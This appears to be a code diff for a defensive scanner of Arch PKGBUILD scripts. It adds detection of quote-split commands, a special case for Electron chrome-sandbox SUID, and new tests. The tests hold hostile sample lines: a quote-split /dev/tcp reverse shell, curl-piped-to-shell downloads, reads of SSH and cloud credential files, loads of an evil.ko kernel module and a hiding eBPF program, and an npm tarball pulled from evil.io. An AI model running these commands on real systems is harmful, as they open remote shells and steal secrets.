@@ -81,16 +81,26 @@ impl Feature for PkgbuildAnalysis {
         let compiled = patterns::compiled_patterns();
         let executable_content = crate::shared::shell_syntax::strip_comments(content);
         let wallet_content = without_checksum_arrays(&executable_content);
+        let joined_content =
+            crate::shared::shell_syntax::join_quoted_fragments(&executable_content);
         let mut signals = Vec::new();
 
         for pat in compiled {
+            // The quote-joined view catches `ba""sh`-style splitting; it is
+            // consulted in addition to, never instead of, the raw view.
             let analyzed_content = if pat.id == "P-CRYPTO-WALLET" {
-                &wallet_content
+                Some(&wallet_content)
+            } else if pat.regex.is_match(&executable_content) {
+                Some(&executable_content)
+            } else if pat.regex.is_match(&joined_content) {
+                Some(&joined_content)
             } else {
-                &executable_content
+                None
             };
 
-            if pat.regex.is_match(analyzed_content) {
+            if let Some(analyzed_content) = analyzed_content
+                && pat.regex.is_match(analyzed_content)
+            {
                 let matched_index = analyzed_content
                     .lines()
                     .position(|line| pat.regex.is_match(line));
@@ -107,6 +117,45 @@ impl Feature for PkgbuildAnalysis {
                     description: pat.description.clone(),
                     is_override_gate: pat.override_gate,
                     matched_line,
+                    min_tier: None,
+                });
+            }
+        }
+
+        // `chmod 4755 "$pkgdir/opt/App/chrome-sandbox"` is the Electron
+        // convention. Down-weight P-SUID-BIT only when every regex hit is
+        // such a line and the active-shell parser agrees every SUID target is
+        // exactly a chrome-sandbox helper.
+        if let Some(position) = signals.iter().position(|signal| signal.id == "P-SUID-BIT") {
+            let changes = crate::shared::js_package_manager::find_privileged_mode_changes(
+                &executable_content,
+                false,
+            );
+            let suid_regex = compiled
+                .iter()
+                .find(|pattern| pattern.id == "P-SUID-BIT")
+                .map(|pattern| &pattern.regex);
+            let regex_lines_are_sandbox = suid_regex.is_some_and(|regex| {
+                executable_content
+                    .lines()
+                    .chain(joined_content.lines())
+                    .filter(|line| regex.is_match(line))
+                    .all(|line| line.contains("chrome-sandbox"))
+            });
+            if regex_lines_are_sandbox
+                && crate::shared::js_package_manager::privileged_changes_only_chrome_sandbox(
+                    &changes,
+                )
+            {
+                let original = signals.remove(position);
+                signals.push(Signal {
+                    id: "P-SUID-CHROME-SANDBOX".to_string(),
+                    category: SignalCategory::Pkgbuild,
+                    points: 30,
+                    description: "SUID bit on an Electron/Chromium chrome-sandbox helper"
+                        .to_string(),
+                    is_override_gate: false,
+                    matched_line: original.matched_line,
                     min_tier: None,
                 });
             }
@@ -175,6 +224,22 @@ mod tests {
     }
 
     // --- Download-and-execute (override gates) ---
+
+    #[test]
+    fn quote_split_reverse_shells_are_joined() {
+        let ids = analyze("ba\"\"sh -i >& /dev/t\"\"cp/1.2.3.4/4444 0>&1");
+        assert!(
+            ids.iter().any(|id| id == "P-REVSHELL-DEVTCP"),
+            "got: {ids:?}"
+        );
+        let ids = analyze("x=$(cu\"\"rl -s https://x | ba\"\"sh)");
+        assert!(has(&ids, "P-CURL-PIPE"), "got: {ids:?}");
+        let ids = analyze("echo \"run: curl -s https://x | sh\" > /dev/null");
+        assert!(
+            has(&ids, "P-CURL-PIPE"),
+            "raw prose behaviour is unchanged: {ids:?}"
+        );
+    }
 
     #[test]
     fn curl_pipe() {
@@ -520,6 +585,83 @@ mod tests {
     }
 
     // --- Kernel modules ---
+
+    #[test]
+    fn packaged_systemd_units_are_not_persistence() {
+        for line in [
+            "install -Dm644 foo.service \"$pkgdir/usr/lib/systemd/system/foo.service\"",
+            "install -Dm644 foo.service \"$pkgdir/usr/lib/systemd/user/foo.service\"",
+            "install -Dm644 foo.service -t \"$pkgdir/usr/lib/systemd/system\"",
+        ] {
+            assert!(!has(&analyze(line), "P-SYSTEMD-CREATE"), "{line}");
+        }
+        for line in [
+            "systemctl --now enable foo.service",
+            "install -Dm644 x.service /etc/systemd/system/x.service",
+            "install -Dm644 x.service \"$HOME/.config/systemd/user/x.service\"",
+        ] {
+            assert!(has(&analyze(line), "P-SYSTEMD-CREATE"), "{line}");
+        }
+    }
+
+    #[test]
+    fn modprobe_by_name_is_weaker_than_loading_a_file() {
+        let ids = analyze("modprobe uinput || true");
+        assert!(has(&ids, "P-KERNEL-MODULE-MODPROBE"), "got: {ids:?}");
+        assert!(!has(&ids, "P-KERNEL-MODULE-LOAD"), "got: {ids:?}");
+        let ids = analyze("modprobe /tmp/x/evil.ko");
+        assert!(has(&ids, "P-KERNEL-MODULE-LOAD"), "got: {ids:?}");
+        let ids = analyze("insmod -f \"$srcdir/evil.ko\"");
+        assert!(has(&ids, "P-KERNEL-MODULE-LOAD"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn credential_store_paths_include_home_variable_and_root() {
+        for line in [
+            "cat \"$HOME/.aws/credentials\"",
+            "cp ${HOME}/.kube/config /tmp/k",
+            "tar czf /tmp/x /root/.docker/config.json",
+            "cat ~/.config/gh/hosts.yml",
+        ] {
+            assert!(has(&analyze(line), "P-CLOUD-CRED-ACCESS"), "{line}");
+        }
+        assert!(has(
+            &analyze("cat \"$HOME/.ssh/id_ed25519\""),
+            "P-SSH-ACCESS"
+        ));
+        assert!(has(&analyze("cat /root/.ssh/id_rsa"), "P-SSH-ACCESS"));
+        assert!(!has(
+            &analyze("install -Dm644 config \"$pkgdir/etc/kube/config\""),
+            "P-CLOUD-CRED-ACCESS"
+        ));
+    }
+
+    #[test]
+    fn npm_remote_tarball_and_narrow_ebpf() {
+        assert!(has(
+            &analyze("npm install https://evil.io/x.tgz"),
+            "P-NPM-REMOTE-TARBALL"
+        ));
+        assert!(has(
+            &analyze("pnpm add git+https://github.com/x/y"),
+            "P-NPM-REMOTE-TARBALL"
+        ));
+        assert!(!has(
+            &analyze("npm ci --cache \"$srcdir/npm-cache\""),
+            "P-NPM-REMOTE-TARBALL"
+        ));
+        assert!(has(
+            &analyze("bpftool prog load hide.o /sys/fs/bpf/hide"),
+            "P-EBPF-PROG-LOAD"
+        ));
+        for benign in [
+            "depends=('bcc' 'libbpf' 'bpftrace')",
+            "make -C tools/bpf/bpftool",
+            "./configure --enable-kprobe --with-perf_event_open",
+        ] {
+            assert!(!has(&analyze(benign), "P-EBPF-PROG-LOAD"), "{benign}");
+        }
+    }
 
     #[test]
     fn kernel_module_load() {
